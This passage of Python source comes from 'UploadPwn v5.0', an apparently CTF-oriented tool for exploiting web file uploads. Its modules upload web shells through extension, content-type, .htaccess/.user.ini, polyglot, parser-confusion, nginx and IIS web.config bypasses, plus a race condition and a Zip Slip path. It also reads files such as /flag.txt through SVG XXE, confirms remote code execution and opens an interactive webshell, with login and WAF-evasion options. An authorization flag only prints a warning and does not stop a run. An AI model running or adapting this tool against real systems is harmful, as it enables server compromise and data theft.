                       os.path.basename(filename.lstrip("./").lstrip("%2f")))
        candidates = list(dict.fromkeys(
            [clean, filename, os.path.basename(filename)]))
        # Prefer paths we *learned* from upload responses; fall back to shell_dirs
        learned_urls = [p if p.startswith("http") else self.sm.target + p
                        for p in self._discovered_paths]
        dir_urls     = [f"{self.sm.target}{d}{fn}"
                        for d in self.shell_dirs for fn in candidates]
        params = [self.cmd_param, "0", "c", "1", "exec"]
        for base in learned_urls + dir_urls:
            for param in params:
                url = f"{base}?{param}={quote(wrapped)}"
                try:
                    r = self.sm.session.get(url, timeout=8)
                except Exception:
                    continue
                if r.status_code == 200 and self._verifier.confirm(r.text, nonce):
                    return True, base, param, r.text.strip()
        return False, "", self.cmd_param, ""

    def launch_shell(self, filename, url, param, output,
                     shell_variant, content_type):
        """Announce RCE and drop into interactive shell."""
        pwn("RCE CONFIRMED!")
        print(f"""
{G}{BOLD}╔═══════════════════════════════════════════════╗
║  ✓  SHELL IS LIVE                             ║
╠═══════════════════════════════════════════════╣
║  File   : {filename[:43]:<43}║
║  URL    : {url[:43]:<43}║
║  Param  : {param:<43}║
║  Shell  : {shell_variant:<43}║
╚═══════════════════════════════════════════════╝{W}""")
        print(f"  First output: {output[:200]}\n")

        if self.d:
            self.d.record_rce(filename, url, output, shell_variant, content_type)

        if self.interactive:
            ws = WebShell(self.sm.session, url, param, self.d)
            ws.interactive(filename, shell_variant, content_type)
        else:
            info(f"To read flag:  curl '{url}?{param}=cat+{self.flag_path}'")
            info(f"To get shell:  run with --interactive flag")

    # ── Module 1: Main bypass matrix ──────────────────────────────────────────
    def attack_matrix(self):
        info("MODULE 1: Full Bypass Matrix")
        filenames = gen_all_filenames()
        info(f"{len(filenames)} filenames × {len({**SHELLS,**ASP_SHELLS,**JSP_SHELLS})} shells "
             f"× {len(CONTENT_TYPES_IMAGE+CONTENT_TYPES_MISC)} content-types")

        for fname in filenames:
            for (fn, content, ct, sname) in build_matrix(fname):
                status, body, _ = self.upload(fn, content, ct)
                if not self.is_success(status, body):
                    if self.verbose:
                        print(f"  {DIM}✗ {fn[:35]} [{sname}]{W}")
                    continue
                ok(f"UPLOADED: {fn} | {sname} | {ct}")
                if self.d:
                    self.d.record_upload_accepted(fn, self.upload_url, ct, payload=content)
                    self.d.record_artifact(self.upload_url, fn, kind="shell")
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, sname, ct)
                    return fn, url
        fail("Matrix complete — no RCE.")
        return None, None

    # ── Module 2: .htaccess ───────────────────────────────────────────────────
    def attack_htaccess(self):
        info(f"MODULE 2: .htaccess / .user.ini / php.ini  ({len(HTACCESS_TRICKS)} tricks)")
        tried_uploads = set()
        for i, trick in enumerate(HTACCESS_TRICKS, 1):
            fn = trick["filename"]
            s, b, _ = self.upload(fn, trick["payload"], "text/plain")
            if not self.is_success(s, b):
                if self.verbose:
                    print(f"  {DIM}✗ {trick['name']} ({fn} rejected){W}")
                continue
            ok(f"trick {i}/{len(HTACCESS_TRICKS)}: {trick['name']} ({fn}) accepted")
            if self.d:
                kind = ("htaccess"  if fn == ".htaccess"
                        else "user_ini" if fn.endswith(".user.ini")
                        else "config")
                self.d.record_artifact(self.upload_url, fn, kind=kind)
                self.d.record_upload_accepted(fn, self.upload_url,
                                              "text/plain", payload=trick["payload"])
            # Upload a matching companion shell and verify
            companions = [("shell.jpg", "image/jpeg"),
                          ("shell.png", "image/png"),
                          ("shell.gif", "image/gif"),
                          ("shell.xxx", "application/octet-stream")]
            for cname, cct in companions:
                if cname in tried_uploads:
                    continue
                tried_uploads.add(cname)
                for sname, sbytes in SHELLS.items():
                    s2, b2, _ = self.upload(cname, sbytes, cct)
                    if not self.is_success(s2, b2):
                        continue
                    rce_ok, url, param, out = self.verify_rce(cname)
                    if rce_ok:
                        if self.d:
                            self.d.filter_bypassed(".htaccess", trick["name"])
                        self.launch_shell(cname, url, param, out, sname, cct)
                        return cname, url
        fail(".htaccess / .user.ini all rejected.")
        return None, None

    # ── Module 9: Polyglot images (real PNG/JPEG/GIF/PDF/ZIP/SVG/etc) ─────
    def attack_polyglots(self):
        try:
            from polyglots import BUILDERS
        except ImportError:
            warn("polyglots module not available (pip install Pillow)")
            return None, None
        info(f"MODULE 9: Real polyglots ({len(BUILDERS)} formats)")
        ct_map = {
            "png":      "image/png",
            "jpg_com":  "image/jpeg",
            "jpg_exif": "image/jpeg",
            "jpg_icc":  "image/jpeg",
            "gif":      "image/gif",
            "pdf":      "application/pdf",
            "zip":      "application/zip",
            "svg":      "image/svg+xml",
            "docx":     "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "mp4":      "video/mp4",
            "mp3":      "audio/mpeg",
            "phar_jpg": "image/jpeg",
            "webp":     "image/webp",
            "avif":     "image/avif",
        }
        ext_map = {
            "png":      ".php.png",
            "jpg_com":  ".php.jpg",
            "jpg_exif": ".php.jpg",
            "jpg_icc":  ".php.jpg",
            "gif":      ".php.gif",
            "pdf":      ".php.pdf",
            "zip":      ".phar",
            "svg":      ".svg",
            "docx":     ".docx",
            "mp4":      ".php.mp4",
            "mp3":      ".php.mp3",
            "phar_jpg": ".phar.jpg",
            "webp":     ".php.webp",
            "avif":     ".php.avif",
        }
        for name, builder in BUILDERS.items():
            try:
                content = builder()
            except Exception as e:
                if self.verbose:
                    fail(f"build {name}: {e}")
                continue
            fname = f"poly_{name}{ext_map.get(name, '.bin')}"
            ct    = ct_map.get(name, "application/octet-stream")
            s, b, _ = self.upload(fname, content, ct)
            if not self.is_success(s, b):
                if self.verbose:
                    print(f"  {DIM}✗ {fname} rejected{W}")
                continue
            ok(f"polyglot accepted: {fname} ({len(content)}B {ct})")
            rce_ok, url, param, out = self.verify_rce(fname)
            if rce_ok:
                if self.d:
                    self.d.filter_bypassed("Strict-image-check", f"polyglot {name}")
                self.launch_shell(fname, url, param, out, f"polyglot_{name}", ct)
                return fname, url
        fail("polyglots — uploads succeeded but no RCE confirmed")
        return None, None

    # ── Module 10: Parser confusion (filename + Content-Disposition tricks) ──
    def attack_parser_confusion(self):
        info(f"MODULE 10: Parser confusion ({len(PARSER_CONFUSION)} variants)")
        for trick in PARSER_CONFUSION:
            extra = trick.get("headers", {})
            s, b, _ = self.upload(trick["filename"], trick["content"],
                                  extra.get("Content-Type", "application/octet-stream"))
            if not self.is_success(s, b):
                if self.verbose:
                    print(f"  {DIM}✗ {trick['name']}{W}")
                continue
            ok(f"parser-confusion accepted: {trick['name']}  ({trick['filename']!r})")
            rce_ok, url, param, out = self.verify_rce(trick["filename"])
            if rce_ok:
                if self.d:
                    self.d.filter_bypassed("Filename validation", trick["name"])
                self.launch_shell(trick["filename"], url, param, out,
                                  trick["name"], extra.get("Content-Type",""))
                return trick["filename"], url
        fail("parser-confusion all rejected.")
        return None, None

    # ── Module 11: Nginx / FPM / Tomcat tricks ─────────────────────────────
    def attack_nginx_tricks(self):
        info(f"MODULE 11: nginx / FPM / Tomcat tricks ({len(NGINX_TRICKS)} variants)")
        for trick in NGINX_TRICKS:
            s, b, _ = self.upload(trick["filename"], trick["content"], trick["ct"])
            if not self.is_success(s, b):
                if self.verbose:
                    print(f"  {DIM}✗ {trick['name']}{W}")
                continue
            ok(f"nginx trick accepted: {trick['name']}  ({trick['filename']!r})")
            rce_ok, url, param, out = self.verify_rce(trick["filename"])
            if rce_ok:
                if self.d:
                    self.d.filter_bypassed("nginx/FPM parser", trick["name"])
                self.launch_shell(trick["filename"], url, param, out,
                                  trick["name"], trick["ct"])
                return trick["filename"], url
        fail("nginx tricks all rejected.")
        return None, None

    # ── Module 12: IIS web.config ──────────────────────────────────────────
    def attack_webconfig(self):
        info(f"MODULE 12: IIS web.config  ({len(WEBCONFIG_PAYLOADS)} variants)")
        for trick in WEBCONFIG_PAYLOADS:
            s, b, _ = self.upload("web.config", trick["payload"], "application/xml")
            if not self.is_success(s, b):
                if self.verbose:
                    print(f"  {DIM}✗ {trick['name']}{W}")
                continue
            ok(f"web.config accepted: {trick['name']}")
            if self.d:
                self.d.record_artifact(self.upload_url, "web.config", kind="web_config")
                self.d.record_upload_accepted("web.config", self.upload_url,
                                              "application/xml", payload=trick["payload"])
            rce_ok, url, param, out = self.verify_rce("web.config")
            if rce_ok:
                if self.d:
                    self.d.filter_bypassed("IIS web.config", trick["name"])
                self.launch_shell("web.config", url, param, out, trick["name"],
                                  "application/xml")
                return "web.config", url
        fail("web.config rejected.")
        return None, None

    # ── Module 3: SVG XXE file read ───────────────────────────────────────────
    def attack_svg_xxe_read(self, filepath):
        info(f"MODULE 3: SVG XXE File Read → {filepath}")
        s, b, _ = self.upload("xxe.svg", SVG_XXE_FILE(filepath), "image/svg+xml")
        if not self.is_success(s, b): return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and len(r.text.strip()) > 5:
                    ok(f"XXE read success!")
                    content = r.text.strip()
                    print(f"\n{G}--- {filepath} ---{W}\n{content[:1000]}")
                    if self.d: self.d.record_xxe(filepath, content)
                    if "HTB{" in content and self.d:
                        self.d.record_flag(content)
                    return content
            except Exception: pass
        return None

    # ── Module 4: SVG XXE PHP source read ────────────────────────────────────
    def attack_svg_xxe_source(self, php_file):
        info(f"MODULE 4: SVG XXE Source → {php_file}")
        s, b, _ = self.upload("xxe_src.svg", SVG_XXE_B64(php_file), "image/svg+xml")
        if not self.is_success(s, b): return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe_src.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and r.text.strip():
                    try:
                        decoded = base64.b64decode(
                            r.text.strip().encode()).decode(errors="replace")
                        ok(f"Source decoded: {php_file}")
                        print(f"\n{G}--- {php_file} ---{W}\n{decoded[:2000]}")
                        if self.d: self.d.record_source(php_file, decoded)
                        # Auto-detect upload dir
                        for m in re.finditer(r"['\"]([./]*\w+/\w*)['\"]", decoded):
                            c = m.group(1)
                            if any(x in c.lower() for x in
                                   ["upload","image","file","media","avatar"]):
                                p = "/"+c.lstrip("./")
                                if p not in self.shell_dirs:
                                    self.shell_dirs.append(p)
                                    ok(f"Upload dir added from source: {p}")
                                    if self.d:
                                        self.d.suggest(f"Upload dir from source: {p}")
                        return decoded
                    except Exception: pass
            except Exception: pass
        return None

    # ── Module 5: Race condition ──────────────────────────────────────────────
    def attack_race(self):
        info("MODULE 5: Race Condition")
        found  = [False]; result = [None]
        fn     = "shell.php"
        ct     = "image/gif"
        content= SHELLS["gif_magic"]

        def uploader():
            for _ in range(100):
                self.upload(fn, content, ct)
                if found[0]: break
                time.sleep(0.01)

        def accessor():
            for _ in range(300):
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    found[0] = True; result[0] = (url, param, out); break
                time.sleep(0.03)

        t1 = threading.Thread(target=uploader, daemon=True)
        t2 = threading.Thread(target=accessor, daemon=True)
        t1.start(); t2.start(); t1.join(); t2.join()

        if result[0]:
            url, param, out = result[0]
            self.launch_shell(fn, url, param, out, "gif_magic", ct)
            if self.d: self.d.filter_bypassed("Validate-then-Delete","race condition")
            return fn, url
        fail("Race condition failed.")
        return None, None

    # ── Module 6: Zip Slip ────────────────────────────────────────────────────
    def attack_zip_slip(self):
        info("MODULE 6: Zip Slip")
        try:
            import zipfile, io
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w") as zf:
                zf.writestr("../../../var/www/html/shell.php",
                            SHELLS["standard"].decode())
                zf.writestr("shell.php", SHELLS["standard"].decode())
            buf.seek(0)
            s, b, _ = self.upload("evil.zip", buf.read(), "application/zip")
            if self.is_success(s, b):
                rce_ok, url, param, out = self.verify_rce("shell.php")
                if rce_ok:
                    self.launch_shell("shell.php",url,param,out,"zip_slip","application/zip")
                    return "shell.php", url
        except Exception as e:
            fail(f"Zip slip: {e}")
        return None, None

    # ── Module 7: Auto-discover form + dirs ──────────────────────────────────
    def discover_all(self, page_url=None):
        info("MODULE 7: Discovery")
        if BS4_OK:
            url = page_url or self.sm.target
            try:
                r    = self.sm.session.get(url, timeout=10)
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    for fi in form.find_all("input", {"type":"file"}):
                        fname = fi.get("name","?")
                        ok(f"Upload field: '{fname}' — use --field {fname}")
                        action = form.get("action")
                        if action:
                            ok(f"Upload action: {urljoin(url, action)}")
                        if self.d:
                            self.d.log("form_discover","found",
                                       f"Field: {fname}, action: {action}")
            except Exception as e:
                fail(f"Form discovery: {e}")

        for d in DEFAULT_SHELL_DIRS + ["/wp-content/uploads/",
                                        "/sites/default/files/"]:
            url = f"{self.sm.target}{d}"
            try:
                r = self.sm.session.get(url, timeout=5)
                if r.status_code in [200, 403]:
                    ok(f"Dir found (HTTP {r.status_code}): {url}")
                    if d not in self.shell_dirs:
                        self.shell_dirs.append(d)
                    if self.d: self.d.log("dir_discover","found",
                                          f"{url} HTTP {r.status_code}")
            except Exception: pass

    # ── Module 8: DoS probes ──────────────────────────────────────────────────
    def attack_dos_probe(self):
        info("MODULE 8: DoS Probes")
        s, b, _ = self.upload("large.jpg", b"A"*50*1024*1024, "image/jpeg")
        if self.is_success(s, b):
            warn("50MB accepted — no size limit (DoS risk)")
            if self.d: self.d.log("DoS","found","No file size limit")
        else:
            ok("File size limit in place")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="UploadPwn v5.0",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
═══ EXAMPLES ══════════════════════════════════════════════════════════

  # Basic — no login, auto-detect everything
  python3 uploadpwn.py -t http://IP:PORT

  # With login (auto-detects form fields + CSRF)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin

  # Login then navigate to upload page (sub-function)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --nav /dashboard \\
    --upload-page /profile/settings \\
    --field avatar

  # Browser login (JS-heavy / complex flow)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --login-method selenium

  # Inject custom cookie/header (already have session)
  python3 uploadpwn.py -t http://IP:PORT \\
    --cookie "PHPSESSID=abc123" \\
    --header "X-Auth-Token: mytoken"

  # SVG XXE — read flag directly (Section 8 HTB)
  python3 uploadpwn.py -t http://IP:PORT --svg-read /flag.txt

  # Read PHP source to find upload dir
  python3 uploadpwn.py -t http://IP:PORT --svg-src upload.php

  # Interactive webshell after RCE
  python3 uploadpwn.py -t http://IP:PORT --interactive

  # Run EVERYTHING
  python3 uploadpwn.py -t http://IP:PORT --all --interactive
═══════════════════════════════════════════════════════════════════════
        """
    )

    # ── Target ────────────────────────────────────────────────────────────────
    ap.add_argument("-t","--target",      default=None,
                    help="Target base URL  e.g. http://10.10.10.10:8080  (required unless -r given)")
    ap.add_argument("-r","--request",     dest="request_file",
                    help="Burp/raw HTTP request file (sqlmap-style); supplies method/URL/headers/body")
    ap.add_argument("--https",            action="store_true",
                    help="Force HTTPS when using -r (Burp dumps don't store scheme)")
    ap.add_argument("-e","--endpoint",    default=None,
                    help="Upload endpoint  e.g. /upload.php  (auto-detected if omitted)")
    ap.add_argument("--shell-dirs",       nargs="+", default=DEFAULT_SHELL_DIRS,
                    help="Directories to search for uploaded shell")
    ap.add_argument("--field",            default=None,
                    help="Upload field name  (auto-detected if omitted)")
    ap.add_argument("--extra-field",      action="append", dest="extra_fields",
                    metavar="NAME=VALUE",
                    help="Add an extra multipart field on every upload (use repeatedly)")
    ap.add_argument("--cmd-param",        default="cmd",
                    help="Shell command parameter name")
    ap.add_argument("--flag",             default="/flag.txt",
                    help="File to read after RCE")

    # ── Auth ──────────────────────────────────────────────────────────────────
    ap.add_argument("--login",            help="Login page path  e.g. /login.php")
    ap.add_argument("--user",             help="Username")
    ap.add_argument("--pass",             dest="password",  help="Password")
    ap.add_argument("--user-field",       default="username",
                    help="Username form field name")
    ap.add_argument("--pass-field",       default="password",
                    help="Password form field name")
    ap.add_argument("--login-method",     default="auto",
                    choices=["auto","requests","selenium"],
                    help="Login method")
    ap.add_argument("--nav",              dest="nav_url",
                    help="Page to navigate to after login  e.g. /dashboard")
    ap.add_argument("--upload-page",      dest="upload_page",
                    help="Page where upload form lives  e.g. /profile/settings")
    ap.add_argument("--cookie",           action="append", dest="cookies",
                    metavar="NAME=VALUE",
                    help="Inject cookie  (use multiple times)")
    ap.add_argument("--header",           action="append", dest="headers",
                    metavar="Name: Value",
                    help="Inject header  (use multiple times)")
    ap.add_argument("--otp-value",        help="One-shot OTP code to submit after password")
    ap.add_argument("--otp-totp-secret",  help="TOTP secret (base32) — auto-generates code")
    ap.add_argument("--otp-prompt",       action="store_true",
                    help="Prompt operator for OTP code at runtime")
    ap.add_argument("--otp-field",        default="code",
                    help="Form field name for the OTP code (default: code)")
    ap.add_argument("--otp-url",          help="Explicit OTP/verify page if auto-detect misses it")

    # ── HTTP-level auth ───────────────────────────────────────────────────────
    ap.add_argument("--basic-auth",       metavar="USER:PASS", help="HTTP Basic auth")
    ap.add_argument("--digest-auth",      metavar="USER:PASS", help="HTTP Digest auth")
    ap.add_argument("--ntlm-auth",        metavar="USER:PASS",
                    help="NTLM (requires `pip install requests-ntlm`)")
    ap.add_argument("--bearer",           metavar="TOKEN",
                    help="Static Bearer token (sets Authorization: Bearer)")
    ap.add_argument("--api-key",          metavar="HEADER:VALUE",
                    help="Static API key header")
    ap.add_argument("--cert",             metavar="PATH",
                    help="Client cert (mTLS); optionally PATH,KEYPATH")
    ap.add_argument("--json-login",       metavar="URL",
                    help="POST creds as JSON to URL (SPA-style)")
    ap.add_argument("--token-path",       metavar="json.path",
                    help='Path into login JSON to pluck token (e.g. "access_token")')
    ap.add_argument("--csrf-path",        metavar="json.path",
                    help="Path into login JSON to pluck rotating CSRF (e.g. \"csrf\")")
    ap.add_argument("--csrf-header",      default="X-CSRF-Token",
                    help="Header name for the CSRF token (default X-CSRF-Token)")

    # ── Transport ─────────────────────────────────────────────────────────────
    ap.add_argument("--proxy",            help="Proxy URL  e.g. http://127.0.0.1:8080 (Burp)")
    ap.add_argument("-k","--insecure",    action="store_true", help="Disable TLS verification")
    ap.add_argument("--ca-bundle",        help="Custom CA bundle")
    ap.add_argument("--timeout",          type=float, default=15)
    ap.add_argument("--delay",            type=float, default=0.0,
                    help="Sleep N seconds between requests (WAF evasion)")
    ap.add_argument("--jitter",           type=float, default=0.0)
    ap.add_argument("--rate-limit",       type=float, default=None, dest="rate_limit",
                    metavar="RPS",
                    help="Max requests per second (token-bucket-lite)")
    ap.add_argument("--request-budget",   type=int, default=5000, dest="request_budget",
                    help="Hard cap on HTTP requests per target (default 5000); "
                         "exit 4 if exhausted")
    ap.add_argument("--waf-pause",        type=float, default=3.0, dest="waf_pause",
                    help="Seconds to sleep when a WAF/IPS fingerprint is detected "
                         "(0 disables auto-pause)")
    ap.add_argument("--retry",            type=int, default=3,
                    help="HTTP-level retries on 429/5xx (with exponential backoff)")
    ap.add_argument("--backoff",          type=float, default=0.5)
    ap.add_argument("--threads",          type=int, default=1,
                    help="Concurrent workers for the attack matrix")
    ap.add_argument("--user-agent",       help="Override User-Agent")
    ap.add_argument("--relogin-on-expiry", action="store_true",
                    help="Re-run login flow automatically when session expires mid-scan")

    # ── Modules ───────────────────────────────────────────────────────────────
    ap.add_argument("--all",              action="store_true",
                    help="Run ALL modules")
    ap.add_argument("--matrix",           action="store_true",
                    help="Full bypass matrix (default)")
    ap.add_argument("--htaccess",         action="store_true",
                    help="Try 32 .htaccess / .user.ini / php.ini tricks")
    ap.add_argument("--polyglots",        action="store_true",
                    help="Real polyglot images (PNG/JPEG/EXIF/ICC/GIF/PDF/ZIP/SVG/MP4/MP3/WebP/AVIF/Phar)")
    ap.add_argument("--parser-confusion", action="store_true", dest="parser_confusion",
                    help="Filename + Content-Disposition smuggling tricks")
    ap.add_argument("--nginx-tricks",     action="store_true", dest="nginx_tricks",
                    help="Nginx / PHP-FPM / Tomcat / Jetty path-info tricks")
    ap.add_argument("--webconfig",        action="store_true",
                    help="IIS web.config handler-hijack variants")
    ap.add_argument("--svg-read",         metavar="PATH",
                    help="SVG XXE read file")
    ap.add_argument("--svg-src",          metavar="FILE",
                    help="SVG XXE read PHP source")
    ap.add_argument("--svg-xss",          action="store_true")
    ap.add_argument("--svg-ssrf",         metavar="URL")
    ap.add_argument("--race",             action="store_true")
    ap.add_argument("--zip",              action="store_true")
    ap.add_argument("--dos",              action="store_true")
    ap.add_argument("--discover",         action="store_true",
                    help="Discover upload form fields and directories")
    ap.add_argument("--discover-only",    action="store_true", dest="discover_only",
                    help="Run EndpointDiscovery (crawl+JS+robots+sitemap+swagger+OPTIONS+GraphQL) and exit")
    ap.add_argument("--attack-all",       action="store_true", dest="attack_all",
                    help="Drive every discovered endpoint (multi-page sites), not just the top-ranked one")
    ap.add_argument("--exhaust",          action="store_true",
                    help="Keep iterating every endpoint under --attack-all even after RCE is confirmed")
    ap.add_argument("--cleanup",          action="store_true",
                    help="At end of run, DELETE every uploaded .htaccess/.user.ini/web.config/shell artifact")
    ap.add_argument("--captcha-prompt",   action="store_true", dest="captcha_prompt",
                    help="When a CAPTCHA is detected on the login page, surface it and prompt the operator")
    ap.add_argument("--i-am-authorized",  action="store_true", dest="i_am_authorized",
                    help="Assert explicit authorization for this engagement (required when "
                         "the operator can't supply HTB/CTF/scope context another way)")
    ap.add_argument("--crawl-depth",      type=int, default=2,
                    help="Discovery crawl depth (default 2)")
    ap.add_argument("--max-pages",        type=int, default=20,
                    help="Discovery crawl page cap (default 20)")
    ap.add_argument("--no-probe",         action="store_true",
                    help="Skip filter fingerprinting")

    # ── Output ────────────────────────────────────────────────────────────────
    ap.add_argument("--interactive",      action="store_true",
                    help="Drop into interactive webshell on RCE")
    ap.add_argument("-v","--verbose",     action="store_true")
    ap.add_argument("-o","--output",      default="uploadpwn_report.json")

    args = ap.parse_args()

    # ── Authorization gate (HARD) ───────────────────────────────────────────
    # The operator must assert authorization for the engagement before any
    # active testing happens. Refuse mass-target invocations.
    if args.target and any(c in args.target for c in (",", "*")):
        fail("Mass-target invocation refused — one target per run.")
        sys.exit(2)
    if not args.i_am_authorized:
        warn("Authorization not asserted via --i-am-authorized.")
        warn("By continuing, you confirm this target is HTB/CTF/lab, owned "
             "infrastructure, or in your written pentest scope.")
        warn("Re-run with --i-am-authorized to suppress this notice and "
             "stamp the audit log.")

    # ── Optional -r raw request ─────────────────────────────────────────────
    burp = None
    if args.request_file:
        burp = BurpRequest.from_file(args.request_file)
        if args.https and not burp.scheme:
            burp.scheme = "https"
        if not args.target:
            # derive target from Host header
            scheme = burp.scheme or ("https" if args.https else "http")
            args.target = f"{scheme}://{burp.host}"
            info(f"Target derived from -r: {args.target}")
        else:
            burp.retarget(args.target)
        if not args.endpoint:
            args.endpoint = burp.path
        if not args.field and burp.upload_field:
            args.field = burp.upload_field

    if not args.target:
        ap.error("--target is required (or pass -r REQUEST_FILE to derive it)")

    target = args.target.rstrip("/")
    creds  = {"username": args.user, "password": args.password} \
             if args.user and args.password else None

    # ── Transport ───────────────────────────────────────────────────────────
    transport = TransportConfig(
        proxy        = args.proxy,
        insecure     = args.insecure,
        timeout      = args.timeout,
        retries      = args.retry,
        backoff      = args.backoff,
        delay        = args.delay,
        jitter       = args.jitter,
        user_agent   = args.user_agent,
        ca_bundle    = args.ca_bundle,
        threads      = args.threads,
        rate_limit     = args.rate_limit,
        request_budget = args.request_budget,
        waf_pause      = args.waf_pause,
    )

    # ── Build session manager ──────────────────────────────────────────────────
    sm = SessionManager(
        target        = target,
        login_url     = join_url(target, args.login) if args.login else None,
        creds         = creds,
        nav_url       = join_url(target, args.nav_url) if args.nav_url else None,
        upload_page   = join_url(target, args.upload_page) if args.upload_page else None,
        user_field    = args.user_field,
        pass_field    = args.pass_field,
        extra_headers = args.headers,
        extra_cookies = args.cookies,
        otp_value         = args.otp_value,
        otp_totp_secret   = args.otp_totp_secret,
        otp_prompt        = args.otp_prompt,
        otp_field         = args.otp_field,
        otp_url           = join_url(target, args.otp_url) if args.otp_url else None,
        transport         = transport,
        relogin_on_expiry = args.relogin_on_expiry,
    )

    # If -r was given, layer its headers/cookies onto the session
    if burp:
        for k, v in burp.headers.items():
            if k.lower() in ("host", "content-length", "content-type"):
                continue
            sm.session.headers[k] = v
        cookie_hdr = burp.headers.get("Cookie", "")
        for pair in cookie_hdr.split(";"):
            pair = pair.strip()
            if "=" in pair:
                kk, vv = pair.split("=", 1)
                try:
                    host = urlparse(target).hostname
                    c = requests.cookies.create_cookie(
                        name=kk.strip(), value=vv.strip(), domain=host, path="/")
                    sm.session.cookies.set_cookie(c)
                except Exception:
                    sm.session.cookies.set(kk.strip(), vv.strip())

    # ── HTTP-level auth adapters ─────────────────────────────────────────────
    def _split(s):
        return s.split(":", 1) if s and ":" in s else (None, None)

    if args.basic_auth:
        u, p = _split(args.basic_auth);  sm.set_auth(AuthAdapter.basic(u, p))
    if args.digest_auth:
        u, p = _split(args.digest_auth); sm.set_auth(AuthAdapter.digest(u, p))
    if args.ntlm_auth:
        u, p = _split(args.ntlm_auth);   sm.set_auth(AuthAdapter.ntlm(u, p))
    if args.bearer:
        sm.set_auth(AuthAdapter.bearer(args.bearer))
    if args.api_key:
        h, v = _split(args.api_key);     sm.set_auth(AuthAdapter.api_key(h, v))
    if args.cert:
        parts = args.cert.split(",", 1)
        sm.set_auth(AuthAdapter.mtls(parts[0], parts[1] if len(parts) > 1 else None))

    # ── JSON-body login ──────────────────────────────────────────────────────
    if args.json_login and creds:
        url = args.json_login if args.json_login.startswith("http") \
              else join_url(target, args.json_login)
        info(f"JSON LOGIN: {url}")
        tok = sm.login_json(url,
                            body={"username": args.user, "password": args.password},
                            token_path=args.token_path,
                            csrf_path=args.csrf_path,
                            csrf_header=args.csrf_header)
        if args.token_path and not tok:
            fail("JSON login failed — no token returned"); sys.exit(2)

    d = Discovery(target, args.output)
    # Stamp the authorization assertion into the audit log.
    d.log("authorization",
          "info" if args.i_am_authorized else "found",
          ("Operator asserted --i-am-authorized"
           if args.i_am_authorized
           else "Authorization not asserted on CLI — relying on operator context"),
          target_url=target)

    # ── CAPTCHA pre-check on login page ──────────────────────────────────────
    if args.login:
        try:
            login_url = join_url(target, args.login)
            pr = sm.session.get(login_url, timeout=transport.timeout)
            if CAPTCHA_PATTERNS.search(pr.text or ""):
                d.log("captcha", "found",
                      f"CAPTCHA challenge present on {login_url}",
                      target_url=login_url, state=STATE_FAILED)
                if args.captcha_prompt:
                    warn("CAPTCHA detected on login page.")
                    warn("Solve it manually in a browser, copy the session cookie, "
                         "and re-run with --cookie 'NAME=VALUE'.")
                    try:
                        input("Press ENTER once a valid session cookie is set, "
                              "or Ctrl-C to abort: ")
                    except (KeyboardInterrupt, EOFError):
                        fail("Operator aborted at CAPTCHA prompt.")
                        sys.exit(2)
                else:
                    fail("CAPTCHA on login page — re-run with --captcha-prompt "
                         "or supply a session cookie via --cookie.")
                    sys.exit(2)
        except Exception as e:
            warn(f"Could not pre-fetch login page for CAPTCHA check: {e}")

    # ── Login ─────────────────────────────────────────────────────────────────
    if args.login and creds:
        try:
            login_ok = sm.login(method=args.login_method)
        except RequestBudgetExceeded as e:
            fail(str(e)); d.save(); sys.exit(4)
        if not login_ok:
            fail("Authentication failed — aborting. "
                 "Double-check creds, --otp-* flags, or grab a session cookie with --cookie.")
            sys.exit(2)
        sm.navigate_to_upload_page()
    elif args.cookies or args.headers:
        info("Using provided cookie/header — skipping login")
    else:
        info("No login configured — unauthenticated")

    # ── Optional: discover-only mode ─────────────────────────────────────────
    if args.discover_only:
        info("Discover-only mode — running EndpointDiscovery…")
        eng = EndpointDiscovery(target=target, transport=transport,
                                session=sm.session,
                                depth=args.crawl_depth, max_pages=args.max_pages)
        ranked = eng.discover()
        print(f"\n{C}{BOLD}  ENDPOINTS FOUND  ({len(ranked)} total){W}\n")
        for ep in ranked:
            print(f"    {ep.score:>3}  {ep.method:<6} {ep.url}  "
                  f"{DIM}[{ep.source}]{W}"
                  + (f"  field={ep.field}" if ep.field else ""))
        sys.exit(0)

    # ── Auto-detect upload endpoint and field ─────────────────────────────────
    upload_endpoint = args.endpoint
    upload_field    = args.field

    all_endpoints = []   # filled when discovery runs or --attack-all set
    if not upload_endpoint or args.attack_all:
        # First try the cheap legacy form-scrape on the configured upload_page
        found_ep    = sm.find_upload_endpoint() if not args.attack_all else None
        found_field = sm.find_upload_field()    if not args.attack_all else None
        if found_ep and not args.attack_all:
            upload_endpoint = found_ep
            upload_field    = upload_field or found_field
            ok(f"Auto-detected endpoint (form-scrape): {upload_endpoint}")
        else:
            info("Running deep endpoint discovery (crawl, JS, robots, sitemap, swagger, OPTIONS)…")
            disc_engine = EndpointDiscovery(target=target, transport=transport,
                                            session=sm.session,
                                            depth=args.crawl_depth, max_pages=args.max_pages)
            ranked = disc_engine.discover()
            all_endpoints = ranked
            if ranked:
                ok(f"Discovery found {len(ranked)} candidate endpoint(s):")
                for ep in ranked[:12]:
                    print(f"    {ep.score:>3}  {ep.method:<6} {ep.url}  "
                          f"{DIM}[{ep.source}]{W}"
                          + (f"  field={ep.field}" if ep.field else ""))
                if not upload_endpoint:
                    top = ranked[0]
                    upload_endpoint = top.url
                    upload_field    = upload_field or top.field or "file"
                    ok(f"Selected top candidate: {top.url} (score={top.score})")
            else:
                warn("Discovery found nothing — falling back to /upload.php")
                upload_endpoint = upload_endpoint or "/upload.php"

    if not upload_field:
        found_field = sm.find_upload_field()
        upload_field = found_field or "file"
        if found_field:
